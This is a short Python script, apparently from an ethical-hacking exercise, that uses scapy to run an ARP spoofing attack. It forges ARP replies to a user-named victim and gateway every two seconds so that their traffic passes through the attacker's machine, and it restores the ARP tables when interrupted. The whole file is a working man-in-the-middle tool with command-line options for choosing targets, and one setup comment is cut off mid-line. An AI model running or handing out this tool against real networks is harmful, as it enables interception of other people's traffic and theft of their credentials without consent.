#! usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse


#packet to trick the victim computer
#op=2 to build a arp response, 1 is for request
#to run do echo 1 >

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Victim IP Address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP Address")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify target IP address, use --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify gateway IP address, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTR + C ... Restoring arp tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Done... Quitting now...")
except:
    print("\n[-] Oops... something went wrong... Quitting program now")